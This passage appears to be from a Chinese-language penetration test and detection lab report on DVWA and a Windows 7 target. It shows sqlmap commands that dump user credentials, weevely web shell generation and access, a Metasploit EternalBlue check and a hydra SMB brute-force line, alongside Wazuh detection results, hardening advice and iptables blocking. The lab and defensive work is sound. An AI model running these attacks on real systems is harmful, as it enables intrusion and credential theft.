### 3.1 V-001: SQL 注入漏洞

**基本信息**

| 项目 | 内容 |
|------|------|
| 目标 URL | `http://192.168.232.135:8080/vulnerabilities/sqli/` |
| 测试工具 | SQLMap v1.8.7 |
| 漏洞类型 | Union-based SQL Injection |
| 风险等级 | 🟠 **高危** |
| CVSS 评分 | 8.6 |

**复现步骤**

```bash
# 1. 探测数据库
sqlmap -u "http://192.168.232.135:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=k2dslpcsfmirp5edtkm54h4l72; security=low" \
  --batch --dbs

# 2. 枚举表
sqlmap -u "..." --batch -D dvwa --tables

# 3. 导出用户凭据
sqlmap -u "..." --batch -D dvwa -T users --dump
```

**测试结果**

SQLMap 检测到 4 种注入类型：
- Boolean-based blind
- Error-based
- Time-based blind
- UNION query

成功导出 **dvwa.users 表** 全部 5 条记录：

| 用户ID | 用户名 | 密码哈希 | 明文密码 |
|--------|-------|---------|---------|
| 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| 2 | gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 3 | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| 4 | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| 5 | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

**Wazuh 检测效果**

| 规则 ID | Level | 描述 | 触发情况 |
|---------|-------|------|---------|
| 31103 | 7 | SQL injection attempt | ✅ 触发 |
| 100010 | 8 | SQL 注入关键字检测 | ✅ 触发 |
| 100011 | 10 | SQLMap 工具检测 | ✅ 触发 |

**加固建议**

| 优先级 | 措施 | 说明 |

### 3.2 V-002: WebShell 上传漏洞

**基本信息**

| 项目 | 内容 |
|------|------|
| 目标 URL | `http://192.168.232.135:8080/vulnerabilities/upload/` |
| 测试工具 | weevely 4.0.1 |
| 漏洞类型 | 任意文件上传 |
| 风险等级 | 🟠 **高危** |
| CVSS 评分 | 7.8 |

**复现步骤**

```bash
# 1. 生成 WebShell
weevely generate p@ssw0rd /tmp/shell.php

# 2. 通过 DVWA 文件上传页面上传 shell.php
# 浏览器访问 DVWA → Upload → 选择文件 → 上传

# 3. 连接 WebShell
weevely http://192.168.232.135:8080/hackable/uploads/shell.php p@ssw0rd
```

**测试结果**

成功连接 WebShell，获取 `www-data` 权限：

```bash
weevely> whoami
www-data

weevely> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Wazuh 检测效果**

| 规则 ID | Level | 描述 | 触发情况 |
|---------|-------|------|---------|
| 554 | 7 | File created | ✅ PHP 文件创建告警 |
| 100031 | 9 | WebShell 通信检测 | ✅ 危险函数请求告警 |

**加固建议**

| 优先级 | 措施 | 说明 |
|--------|------|------|
| P0 | 文件类型白名单 | 仅允许 jpg/png/gif 等图片格式 |
| P1 | 上传目录禁止执行 | Apache 配置 `<Directory>` 禁用执行权限 |
| P2 | 上传文件重命名 | 使用 UUID 重命名避免原始文件名 |

### 3.3 V-003: MS17-010 永恒之蓝

**基本信息**

| 项目 | 内容 |
|------|------|
| 目标 | Win7 靶机 |
| 测试工具 | Metasploit Framework |
| CVE | CVE-2017-0143 ~ CVE-2017-0148 |
| 风险等级 | 🟡 **中危** |
| CVSS 评分 | 9.8 |

**测试过程**

```bash
# 1. 端口扫描
nmap -p445 192.168.232.134
# 445/tcp open

# 2. MSF 检测
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.232.134
msf6 > check
# Host does NOT appear vulnerable.
```

**测试结果**

| 检测项 | 结果 |
|--------|------|
| SMB 端口 445 | ✅ 开放 |
| 防火墙 | ❌ 关闭后仍失败 |
| 系统补丁 KB4012* | ❌ 未安装 |
| OS 版本 | Windows 7 Home Basic SP1 |
| 漏洞可利用性 | ❌ **不可利用** |

**失败原因分析**

Windows 7 **家庭普通版 (Home Basic)** 不包含完整的 SMBv1 服务器组件，导致 MS17-010 永恒之蓝漏洞无法利用。这与旗舰版/专业版的 SMB 协议栈存在差异。

**替代方案**

```bash
# 换用其他攻击方式（如弱口令爆破）
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.232.134
```

**加固建议**

| 优先级 | 措施 | 说明 |
|--------|------|------|
| P0 | 升级系统 | 升级到 Win7 旗舰版或 Win10 |
| P1 | 安装安全补丁 | KB4013389 及后续安全更新 |
| P2 | 禁用 SMBv1 | Set-SmbServerConfiguration -EnableSMB1Protocol $false |

## 五、自动化响应测试

### 5.1 自动封禁脚本

| 指标 | 目标值 | 实测值 |
|------|-------|-------|
| MTTR 响应时间 | < 5s | **< 2s** |
| 封禁方式 | iptables DROP | DOCKER-USER 链 |
| 触发规则 | Level >= 10 | 自定义规则集 |

### 5.2 Docker 环境特殊处理

DVWA 运行在 Docker 容器中，iptables 默认 INPUT 链不生效，需对 DOCKER-USER 链操作：

```bash
# 正确封禁容器流量
sudo iptables -I DOCKER-USER -s <攻击者IP> -j DROP

# 持久化规则
sudo apt install iptables-persistent -y
sudo netfilter-persistent save
```
